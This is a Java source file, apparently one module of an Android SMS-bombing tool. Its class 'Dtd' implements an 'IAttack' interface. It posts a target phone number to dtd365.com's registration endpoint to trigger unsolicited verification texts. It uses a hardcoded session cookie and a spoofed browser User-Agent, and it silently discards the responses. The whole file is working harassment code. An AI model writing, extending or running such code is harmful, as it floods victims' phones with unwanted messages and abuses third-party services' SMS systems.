package com.example.wudi.sms.sites;

import android.util.Log;

import com.example.wudi.sms.MainApplication;
import com.example.wudi.sms.Utils;
import com.squareup.okhttp.Callback;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

/**
 * Created by wudi on 12/16/2015.
 */
public class Dtd implements IAttack {
    @Override
    public void attack() {
        final MediaType text = MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8");

        OkHttpClient client = new OkHttpClient();
        client.setConnectTimeout(5000, TimeUnit.MILLISECONDS);
        client.setReadTimeout(5000, TimeUnit.MILLISECONDS);
        client.setWriteTimeout(5000, TimeUnit.MILLISECONDS);
        String postBody = "phone=" + Utils.getNumber(MainApplication.context) +"&form_hash=66c7a5d685eee9533ea3e725afb4352b&act=getphone";

        Request request = new Request.Builder()
                .url("http://www.dtd365.com/?user&q=reg&type=ajax")
                .post(RequestBody.create(text, postBody))
                .addHeader("Cookie", "PHPSESSID=h3t9e9pu9ll3sig91mgcje0mo1; analyse_id=Cos0PVZxaRLCUBdTA0shAg==; _ga=GA1.2.790173815.1450273044; _gat=1; Hm_lvt_1383a459744bcc0bfe161a7427cf1f7b=1450273045; Hm_lpvt_1383a459744bcc0bfe161a7427cf1f7b=1450273048; Hm_lvt_897402e6322ff7182712c35ecd36f2a5=1450273045; Hm_lpvt_897402e6322ff7182712c35ecd36f2a5=1450273048")
                .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586")
                .addHeader("Accept-Encoding", "gzip, deflate")
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Request request, IOException e) {
            }

            @Override
            public void onResponse(Response response) throws IOException {
                response.body().close();
            }
        });
    }
}
